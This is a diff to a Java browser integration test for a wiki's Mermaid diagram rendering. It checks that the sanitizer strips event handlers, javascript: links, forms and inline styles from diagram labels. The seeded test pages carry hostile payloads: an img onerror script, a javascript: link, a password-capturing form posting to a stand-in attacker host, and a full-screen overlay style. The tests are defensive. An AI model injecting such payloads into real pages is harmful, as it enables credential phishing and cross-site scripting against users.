@@ -42,7 +42,7 @@ import static org.junit.jupiter.api.Assertions.assertTrue;
  * Browser coverage for rendered fences: a Mermaid diagram is drawn as SVG in the real SPA, an {@code example}
  * fence stays code, a broken diagram shows an error with the source kept, a diagram {@code click} link navigates
  * and counts as a backlink, the server HTML carries the escaped source with JS off, and Mermaid's sanitizer
- * strips handlers from labels.
+ * strips handlers, forms and inline styles from labels.
  */
 public class RenderedFencesIT extends WithIntegrationTestSetup {
 
@@ -52,6 +52,7 @@ public class RenderedFencesIT extends WithIntegrationTestSetup {
     private static final String SOURCE = "FenceSource" + TS;
     private static final String HANDLER = "FenceHandler" + TS;
     private static final String JSLINK = "FenceJsLink" + TS;
+    private static final String FORM = "FenceForm" + TS;
 
     @BeforeAll
     static void seed() throws Exception {
@@ -62,13 +63,18 @@ public class RenderedFencesIT extends WithIntegrationTestSetup {
             + "```mermaid\nthis is definitely not a diagram ((\n```\n" );
         RestSeedHelper.writePage( HANDLER, "# " + HANDLER + "\n\n"
             + "```mermaid\nflowchart LR\n  A[\"<img src=x onerror=alert(1)>\"] --> B[End]\n```\n" );
+        RestSeedHelper.writePage( FORM, "# " + FORM + "\n\n"
+            + "```mermaid\nflowchart LR\n"
+            + "  A[\"<form action='https://evil.example/x'><input type='password'><textarea>t</textarea>"
+            + "<select><option>o</option></select><button>Go</button></form>\"]"
+            + " --> B[\"<span style='position:fixed;inset:0;z-index:99999'>Overlay</span>\"]\n```\n" );
         RestSeedHelper.writePage( JSLINK, "# " + JSLINK + "\n\n"
             + "```mermaid\nflowchart LR\n  A[\"<a href='javascript:alert(1)'>x</a>\"] --> B[End]\n```\n" );
     }
 
     @AfterAll
     static void cleanUp() {
-        for ( final String n : new String[] { SOURCE, HANDLER, JSLINK, TARGET } ) {
+        for ( final String n : new String[] { SOURCE, HANDLER, JSLINK, FORM, TARGET } ) {
             RestSeedHelper.deletePageQuietly( n );
         }
     }
@@ -146,6 +152,25 @@ public class RenderedFencesIT extends WithIntegrationTestSetup {
             + "return [svg, ...svg.querySelectorAll('*')].some(el => [...el.attributes].some(a =>"
             + " /^on/i.test(a.name) || /^\\s*javascript:/i.test(a.value)));" );
         assertEquals( Boolean.FALSE, unsafe, "drawn SVG must carry no on* attribute or javascript: URL" );
+    }
+
+    @Test
+    void diagramLabelCannotCarryFormsOrInlineStyles() {
+        ViewWikiPage.open( FORM );
+        $( "figure.wk-fence[data-fence-state=drawn] svg" ).shouldBe( Condition.exist, WAIT );
+        final Object forms = Selenide.executeJavaScript(
+            "return document.querySelectorAll('figure.wk-fence[data-fence-state=drawn] svg"
+            + " :is(form, input, button, textarea, select, option)').length;" );
+        assertEquals( 0L, ( ( Number ) forms ).longValue(), "drawn SVG must hold no form or form control" );
+        // Mermaid styles its own label wrappers; only an author-supplied style would carry these properties.
+        final Object styled = Selenide.executeJavaScript(
+            "return [...document.querySelectorAll('figure.wk-fence[data-fence-state=drawn] svg [style]')]"
+            + ".some(el => /position\\s*:\\s*fixed|z-index/i.test(el.getAttribute('style')));" );
+        assertEquals( Boolean.FALSE, styled, "label HTML must carry no author-supplied inline style" );
+        // The label text itself survives: the sanitizer drops the tags, not the diagram.
+        final Object text = Selenide.executeJavaScript(
+            "return document.querySelector('figure.wk-fence[data-fence-state=drawn] svg').textContent;" );
+        assertTrue( String.valueOf( text ).contains( "Overlay" ), "label text survives: " + text );
     }
 
     @Test
